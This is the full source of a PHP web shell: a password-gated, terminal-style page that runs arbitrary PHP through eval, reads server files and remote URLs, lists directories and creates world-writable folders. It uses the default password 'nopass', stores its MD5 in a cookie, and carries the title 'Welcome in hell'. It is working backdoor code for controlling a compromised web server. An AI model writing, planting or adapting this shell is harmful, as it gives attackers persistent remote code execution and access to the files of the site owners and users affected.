<?php

//############################
// Secret path for G33k
// Thx jac3n... :)
//############################
    
// A changer évidemment
$passwd = 'nopass';


//############################
// DO NOT MODIFY AFTER
//############################

$logged = false; //boolean
if( md5($passwd) == $_COOKIE['_dos'] ) { $logged = true; }

//############################
// Récuperation des datas
//############################

header("Content-type: text/html; charset=iso-8859-1");

if( isset($_GET['cmd']) ) // envoi Ajax
 {
  $_GET['cmd'] = stripslashes($_GET['cmd']); // anti \\

  // future response
  $response = null;
  $tmp = explode(' ', $_GET['cmd']);
  $tmp = array_filter($tmp);

  // cmd à traiter
  $cmd = rtrim($tmp[0]);

  unset($tmp[0]); // on enleve la cmd de l'array

  // cmd à afficher
  if($cmd[0] == "/") $cmd = substr($cmd,1); // avec ou sans slash

  // réorgaisation de l'array -cmd
  $att =  explode(' ', implode(' ', $tmp));

  // string attr
  $att_ = implode(' ', $tmp);

function getLinks($source)
  { //(https?:\/+)?
  $regex = '/("(\/[\w-\.\/]+)?(\?[^"]*)?")/';
  
  preg_match_all($regex, $source, $out);

  $new = array_unique($out[0]);
        
  foreach($new as $key => $value)
    {
    $new[$key] = preg_replace('/"([^"]*)"/', '$1', $value); // enleve les quotes
    
    if(rtrim($new[$key]) == null || rtrim($new[$key]) == '?') // supprime les key inutiles
      {
      unset($new[$key]);
      }
        
    else{
      $new[$key] = urldecode($new[$key]);
      }
    }
    
  return $new;
  }  

 function redirect($to) {
    if (headers_sent())
    {
      echo '<meta http-equiv="refresh" content="0;URL='.$to.'">';
    }
    else
    {
      header("Location: $to");
    }
  }
    
function fs_mkdir($path) {
  $newpath = null;
  $all = array_filter(explode('/', $path));
  foreach($all as $dir)
  {
    $newpath .= "$dir/";
    if(!file_exists($newpath)) mkdir($newpath ,0777) or $err = true;
  }
  return $err;
}
   
//############################
// Analyse de la commande
//############################
  
switch($cmd) :

//LOGIN
case 'log' : { 

  if($logged) $response .= 'Already logged.';

  elseif( empty($att[0]) ) { $response .= 'No password given !'; } //aucun pass

  elseif( $att[0] == $passwd ) { $response .= 'Login ok.'; setcookie('_dos', md5($passwd)); } //logged in

  else $response .= 'Bad password'; // vtff

  break;
  }
  
//LIST CMDs
case 'all' : { 

  $response .= "<ul> echo\t->\t:)\n redo\t->\tretape la dernière commande\n clear\t->\tvide la console\n log\t->\troot login\n dir\t->\tliste les fichiers d'un dossier\n fgc\t->\taffiche le contenu d'un fichier\n inc\t->\taccroche un site\n eval\t->\tconsole PHP\n index\t->\tindexe un site dans un répertoire\n</ul>";
  break;
  }
  
//PRINT
case 'echo' : { 

  $response .= htmlspecialchars($att_);
  break;
  }
  
//GET FILE CONTENTS
case 'fgc' : { 

  if($logged) {

  if( empty($att[0]) ) { $response .= 'Syntaxe : /fgc &lt;file_path&gt; &lt;int is_an_url&gt;'; }

  elseif( !empty($att[1]) ) {
  
    $response .= '<br/>Getting the URL '.htmlspecialchars($att[0]).'<br/><ul>';

    if(!preg_match('/^(\w+:\/\/)/', $att[0])) { $att[0] = 'http://'.$att[0]; }
  
    $response .= htmlentities(@file_get_contents($att[0]));
    
    $response .= '<br/></ul>Done.';
    }
  
  elseif(@is_dir($att[0]) || @is_dir($_SERVER['DOCUMENT_ROOT'].'/'.$att[0])) { $response .= '<br/>'.htmlspecialchars($att[0]).' : est un dossier.'; break; }

  elseif(@file_exists($att[0]))
      {
      $response .= '<br/>Getting the file '.htmlspecialchars($att[0]).'<br/><ul>';
      $response .= htmlentities(@file_get_contents($att[0]));
      $response .= '<br/></ul>Done.';
      }

  elseif(@file_exists($_SERVER['DOCUMENT_ROOT'].'/'.$att[0]))
      {
      $response .= '<br/>Getting the file '.htmlspecialchars(realpath($_SERVER['DOCUMENT_ROOT'].'/'.$att[0])).'<br/><ul>';
      $response .= htmlentities(@file_get_contents($_SERVER['DOCUMENT_ROOT'].'/'.$att[0]));
      $response .= '<br/></ul>Done.';
      }

    else { $response .= '<br/>'.htmlspecialchars($att[0]).' : fichier introuvable.'; }
  }

  else $response .= 'Not logged in...';
  break;
  }
  
//LISTING
case 'dir' : { 

  if($logged) {

    if( empty($att[0]) ) $response .= 'Syntaxe : /dir &lt;path&gt; &lt;*.*&gt;';

    elseif(!@is_dir($att[0]) && !@is_dir($_SERVER['DOCUMENT_ROOT'].'/'.$att[0])) $response .= htmlspecialchars($att[0]).' n\'est pas un dossier.';

    else   {
      $src = @is_dir($att[0]) ? $att[0] : @is_dir($_SERVER['DOCUMENT_ROOT'].'/'.$att[0]) ? realpath($_SERVER['DOCUMENT_ROOT'].'/'.$att[0]) : 0;

      if(!$src) {$response .= 'Impossible de trouver le dossier '.htmlspecialchars($att[0]).''; break;}

      $response .= '<br/>Listing '.htmlspecialchars($src).'<br/><ul>';

      $handle = @opendir($src); //opendir

      while( ($file = @readdir($handle)) !== false )
        {
        if(empty($att[1])) {$response .= htmlspecialchars($file).'<br/>';} //correspondance *.*
        else {

        $att[1] = str_replace('*','.',$att[1]); //convertion en regex

        if(preg_match('`'.$att[1].'`', preg_quote($file)))
          {
          $response .= htmlspecialchars($file).'<br/>';
          }
           }//end else
        }

      @closedir($handle);
      $response .= '</ul>';

       }
    }

  else $response .= 'Not logged in...';

  break;
  }

case 'mkdir' : { 

  if($logged) {
  
    if( empty($att[0]) ) $response .= 'Syntaxe : /mkdir all/pathes/you/want';
    
    else
      {
      $att[0] = $_SERVER['DOCUMENT_ROOT'] . '/' . $att[0];
      
      @fs_mkdir($att[0]);
      
      $response = '<br/>Directory created : '.realpath($att[0]);
      }
    }

  else $response .= 'Not logged in...';

  break;
  }
  
//EVALUATION DE CODE PHP
case 'eval' : {

  if($logged) {

    if(empty($att[0])) $response .= 'Syntaxe : /eval &lt;on-off&gt;';

    else{
      echo '/eval ['.$att_.']<br/><br/>&lt;Server Response&gt;<ul>';
      
      echo( eval( $att_ ) );
      
      echo "</ul>&lt;/Server Response&gt;";
      
      exit;
      }

    }
    else $response .= 'Not logged in...';

  break;
  }
  
//EVALUATION DE CODE PHP
case 'eval' : {

  if($logged) {

    if(empty($att[0])) $response .= 'Syntaxe : /eval &lt;on-off&gt;';

    else{
      echo '/eval ['.$att_.']<br/><br/>&lt;Server Response&gt;<ul>';
      
      echo( eval( $att_ ) );
      
      echo "</ul>&lt;/Server Response&gt;";
      
      exit;
      }

    }
    else $response .= 'Not logged in...';

  break;
  }
  
//ERROR
default : { 

  $response .= htmlspecialchars($cmd).' n\'est pas une syntaxe valide'; //commande inconnue
  break;
  }

endswitch;

//PRINT
$final =  htmlspecialchars($_GET['cmd']).'<br/>'.$response ;

exit($final);
}

?>

<html>
<head>
<title>Welcome in hell</title>
<style type="text/css">

body, body * {

   background-color : #000000;
   font-size : 13px;
   font-family : "lucida console", sans-serif;
   color : green;
}

  input[type=text] {

   padding : 0px;
   width : 80%;
   border : 0px;
   outline:none;

}

span {

   white-space:pre;
}


</style>

<script type="text/javascript">

function gid(id) { return document.getElementById(id); }

var scriptname = save = save2 = "#~<?= basename(__FILE__) ?>&gt";

var redo = null;
var Eval = false;

function createCookie(name,value,days) {

  if (days) {
    var date = new Date();
    
    date.setTime(date.getTime()+(days*24*60*60*1000));
    
    var expires = "; expires="+date.toGMTString();
    }
  
  else var expires = "";
  
  document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) {

  var nameEQ = name + "=";
  
  var ca = document.cookie.split(';');
  
  for(var i=0;i < ca.length;i++) {
  
    var c = ca[i];
    
    while (c.charAt(0)==' ') c = c.substring(1,c.length);
    
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    
  return null;
}

//bind
function manage(e) {

  if(e.keyCode == 13) { //[ENTER]

    //DESACTIVE LE MODE INC
  if( gid('cmd').value.match(/^(\/?inc off)/) )
    {
    createCookie('_dos_inc', '', -1); //delete le cookie
    
    scriptname = save2;
    Eval = false;
    
    var Nodenew = document.createElement("span");

      Nodenew.innerHTML = "<br/>Inclusion automatique désactivée<br/><br/>"+scriptname+" " ; //à afficher

      document.body.insertBefore( Nodenew, gid('cmd') ); //avant l'input

    
    gid('cmd').value = "";    
    gid('cmd').focus();

    self.scroll(0, document.body.scrollTop + 15 );
    return false;
    }

  
  //CLEAR LA CONSOLE VIA CMD
  if( gid('cmd').value.match(/^(\/?clear)/) )
    {
    document.body.innerHTML = scriptname+' <input type="text" id="cmd" value="" maxlength="350" />';
    
    gid('cmd').focus();
    return false;
    }


    //REECRIT LA DERNIÈRE ACTION
    if( gid('cmd').value.match(/^(\/?redo)/) )
      {
      if(redo != null)
        gid('cmd').value = redo;

      return false;
      }


  //ACTIVE LE MODE EVAL
  if( gid('cmd').value.match(/^\/?eval on/) )
    {
    Eval = true;

    scriptname = '[PHP]';

      var Nodenew = document.createElement("span");

        Nodenew.innerHTML = "<br/>"+scriptname+" " ; //à afficher

        document.body.insertBefore( Nodenew, gid('cmd') ); //avant l'input

        
    gid('cmd').value = "";
    
    gid('cmd').focus();
    
    self.scroll(0, document.body.scrollTop + 15);
    }

  //DESACTIVE LE MODE EVAL
  if(gid('cmd').value.match(/^\/?eval off/))
    {
    Eval = false;

    scriptname = save;

      var Nodenew = document.createElement("span");

        Nodenew.innerHTML = "<br/>"+scriptname+" " ; //à afficher

        document.body.insertBefore( Nodenew, gid('cmd') ); //avant l'input


    gid('cmd').value = "";
    
    gid('cmd').focus();
    
    self.scroll(0, document.body.scrollTop + 15 );
    }

  //COMMANDE NON VIDE
  else if( gid('cmd').value.match(/[^\s]/) )
  {
    gid('cmd').disabled = true; //readonly

    redo = gid('cmd').value; //methode redo

    //ENVOI DE LA REQUETE
    var xhr = false;

    if(window.XMLHttpRequest)
      {
      xhr = new XMLHttpRequest();
      }

    else{
      return false;
      }

    //eval mode ?
    var Url = Eval ? '?cmd=eval '+gid('cmd').value : '?cmd='+gid('cmd').value; //passage des arguments GET

    xhr.open("GET", Url, true);

    xhr.send(null);

    xhr.onreadystatechange = function()
      {
      if(xhr.readyState == 4) {

      if(xhr.responseText.match(/(Not logged)/)) { Eval = false; scriptname = save; } //annulation du eval

        var Nodenew = document.createElement("span");

        Nodenew.innerHTML = xhr.responseText +"<br/><br/>"+scriptname+" " ; // Affiche la réponse du script

        document.body.insertBefore(Nodenew, gid('cmd') ); //avant l'input

        gid('cmd').value = "";
        gid('cmd').disabled = false;
        
        gid('cmd').focus();

        self.scroll(0, document.body.scrollTop + 15 );
        }
      }
    }
  else  {
    return false ; //vide
    }

  return true;
  }
else{
    return false; //not [ENTER]
    }
}

</script>

</head>

<body onload="gid('cmd').value = ''; gid('cmd').focus()" onmouseup="gid('cmd').focus();return false;" onkeypress="manage(event)">
Welcome. Please log u with the cmd /log &lt;passwd&gt;<br/>
Display the commands list with /all<br/><br/>

#~<?= basename(__FILE__) ?>&gt; <input type="text" id="cmd" value="" maxlength="350" />

</body>

</html>
